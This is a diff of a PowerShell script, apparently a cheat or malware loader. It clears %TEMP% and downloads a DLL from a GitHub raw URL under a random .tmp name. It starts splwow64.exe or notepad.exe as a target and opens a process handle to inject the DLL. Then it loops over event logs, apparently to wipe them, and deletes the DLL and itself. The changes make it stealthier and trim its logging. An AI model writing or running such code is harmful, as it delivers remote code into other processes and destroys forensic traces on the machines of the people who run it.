@@ -13,6 +13,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
         exit 1
     }
 }
+
 # === Fixed LookupFunc ===
 function LookupFunc {
     Param ($moduleName, $functionName)
@@ -35,6 +36,7 @@ function LookupFunc {
     $hModule = $kernel32::GetModuleHandle($moduleName)
     return $kernel32::GetProcAddress($hModule, $functionName)
 }
+
 function getDelegateType {
     Param (
         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
@@ -61,126 +63,99 @@ function getDelegateType {
     ).SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
-# === Hidden DLL URL (Obfuscated as Hex Byte Array) ===
-$dllUrl = https://raw.githubusercontent.com/novaxstorex/Premium/main/Premium.ps1
 
 # === 1. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
 try {
+    # Remove all files and subdirectories in Temp. 
+    # -Recurse -Force is needed. ErrorAction SilentlyContinue ignores locked files.
     Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
     Write-Host "[+] Temp cleared." -ForegroundColor Green
 }
 catch {
     Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
 }
+
 # === 2. Download DLL to %TEMP% with Random Name ===
+# Generate a random filename using GUID + .tmp extension
 $randomGuid = [System.Guid]::NewGuid().ToString()
-$dllFileName = "$randomGuid.dll"
+$dllFileName = "$randomGuid.tmp"
+
+# Force path to TEMP
 $dllPath = Join-Path $env:TEMP $dllFileName
+$dllUrl = "https://raw.githubusercontent.com/fourtikeeree-wq/silvex1/main/NOVA_Premuim.dll"
 
 try {
-    Write-Host "[+] Downloading DLL..." -ForegroundColor Cyan
-    Write-Host "[+] Saving to: $dllPath" -ForegroundColor Cyan
-    
+    # Use WebClient or Invoke-WebRequest. WebClient is often quieter.
     $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
-    
+    # Optional: Add a user agent if the server blocks default PowerShell agents
+    # $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
     $webClient.DownloadFile($dllUrl, $dllPath)
     $webClient.Dispose()
     
     if (Test-Path $dllPath) {
-        $fileSize = (Get-Item $dllPath).Length
-        if ($fileSize -gt 0) {
-            Write-Host "[+] Download successful! File size: $fileSize bytes" -ForegroundColor Green
-        } else {
-            throw "File size is 0 bytes - download may have failed"
-        }
+        Write-Host "[+] Download successful." -ForegroundColor Green
     } else {
         throw "File not found after download."
     }
 }
 catch {
     Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Trying alternative download method..." -ForegroundColor Yellow
-    
-    try {
-        Write-Host "[+] Using Invoke-WebRequest as fallback..." -ForegroundColor Cyan
-        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        
-        if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
-            Write-Host "[+] Download successful via fallback!" -ForegroundColor Green
-        } else {
-            throw "Fallback download failed"
-        }
-    }
-    catch {
-        Write-Host "[!] All download methods failed: $($_.Exception.Message)" -ForegroundColor Red
-        exit 1
-    }
+    exit 1
 }
-# === ตรวจสอบไฟล์ DLL ก่อนทำการ Inject ===
+
+# === Launch Target Process (splwow64.exe with notepad.exe fallback) ===
+$primaryExe = "splwow64.exe"
+$fallbackExe = "notepad.exe"
+$targetExe = $primaryExe
+$targetProcess = "splwow64"
+$proc = $null
+
+Write-Host ""
+Write-Host "[+] Attempting to launch $primaryExe..." -ForegroundColor Yellow
+
+# --- Try Primary Target: splwow64.exe ---
 try {
-    $fileInfo = [System.IO.File]::ReadAllBytes($dllPath)
-    if ($fileInfo.Length -lt 1024) {
-        Write-Host "[!] Warning: DLL file is very small (possible download error)" -ForegroundColor Yellow
+    # ตรวจสอบว่าไฟล์มีอยู่ในระบบหรือไม่
+    $primaryPath = Get-Command $primaryExe -ErrorAction SilentlyContinue
+    if ($primaryPath) {
+        $proc = Start-Process -FilePath $primaryExe -WindowStyle Normal -PassThru -ErrorAction SilentlyContinue
     }
-    Write-Host "[+] DLL file verified. Size: $($fileInfo.Length) bytes" -ForegroundColor Green
+    
+    if ($proc) {
+        Start-Sleep -Seconds 2
+        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+    }
 }
 catch {
-    Write-Host "[!] Could not verify DLL: $($_.Exception.Message)" -ForegroundColor Yellow
+    Write-Host "[!] Error launching $primaryExe : $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
-# === ค้นหา RuntimeBroker.exe ที่กำลังทำงานอยู่ หรือใช้ Notepad เป็น Fallback ===
-Write-Host ""
-Write-Host "[+] Looking for RuntimeBroker.exe process..." -ForegroundColor Yellow
-
-$proc = $null
-$targetProcess = "RuntimeBroker"
-$targetExe = "RuntimeBroker.exe"
-
-# 1. ลองค้นหา RuntimeBroker ที่กำลังทำงานอยู่
-try {
-    $existingProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-    
-    if ($existingProc) {
-        Write-Host "[+] Found existing RuntimeBroker.exe (PID: $($existingProc.Id))" -ForegroundColor Green
-        $proc = $existingProc
-    }
-} catch {
-    Write-Host "[!] Could not find existing RuntimeBroker process" -ForegroundColor Yellow
-}
-
-# 2. ถ้าไม่เจอ ให้ลองเปิด Notepad แทน
+# --- Fallback to notepad.exe if primary failed ---
 if (-not $proc) {
-    Write-Host "[!] RuntimeBroker.exe not found or not running" -ForegroundColor Yellow
-    Write-Host "[+] Using Notepad.exe as target process instead..." -ForegroundColor Cyan
-    
+    Write-Host "[!] Failed to start $primaryExe, falling back to $fallbackExe..." -ForegroundColor Yellow
     try {
-        $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
+        $proc = Start-Process -FilePath $fallbackExe -WindowStyle Normal -PassThru -ErrorAction Stop
         $targetProcess = "notepad"
-        $targetExe = "notepad.exe"
+        $targetExe = $fallbackExe
         
         Start-Sleep -Seconds 2
         $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
         
         if (-not $proc) {
-            Write-Host "[!] Failed to start Notepad.exe" -ForegroundColor Red
+            Write-Host "[!] Fallback process exited prematurely" -ForegroundColor Red
             exit 1
         }
-        Write-Host "[+] Successfully launched Notepad.exe (PID: $($proc.Id))" -ForegroundColor Green
+        Write-Host "[+] Successfully launched fallback: $fallbackExe" -ForegroundColor Green
     }
     catch {
-        Write-Host "[!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Failed to start fallback $fallbackExe : $($_.Exception.Message)" -ForegroundColor Red
         exit 1
     }
 }
-
-# 3. ถ้ายังไม่มี process ให้ error
-if (-not $proc) {
-    Write-Host "[!] No target process available" -ForegroundColor Red
-    exit 1
+else {
+    Write-Host "[+] Successfully launched: $primaryExe" -ForegroundColor Green
 }
 
 $pid1 = $proc.Id
@@ -218,15 +193,7 @@ try {
     
     if ($hProcess -eq [IntPtr]::Zero) {
         Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
-        Write-Host "[!] Trying with PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE (0x0002 | 0x0008 | 0x0020)..." -ForegroundColor Yellow
-        
-        # ลองใช้สิทธิ์น้อยลง
-        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)  # 0x002A = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
-        
-        if ($hProcess -eq [IntPtr]::Zero) {
-            Write-Host "[!] Still failed to open process handle" -ForegroundColor Red
-            exit 1
-        }
+        exit 1
     }
     Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
     
@@ -340,27 +307,16 @@ foreach ($logName in $logNames) {
 # 9. Delete the random DLL from Temp
 Start-Sleep -Seconds 1
 if (Test-Path $dllPath) { 
-    try { 
-        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] DLL file removed: $dllPath" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not remove DLL file: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
+    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
 }
 
 # 10. Delete the script itself
 if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
-    try {
-        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Script self-deleted" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not delete script" -ForegroundColor Yellow
-    }
+    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
 }
 
 # 11. Force GC and wait a bit to let system settle
 [GC]::Collect()
-[GC]::WaitForPendingFinalizers()
 Start-Sleep -Seconds 2
-Write-Host "[+] Cleanup complete" -ForegroundColor Green
+
 exit
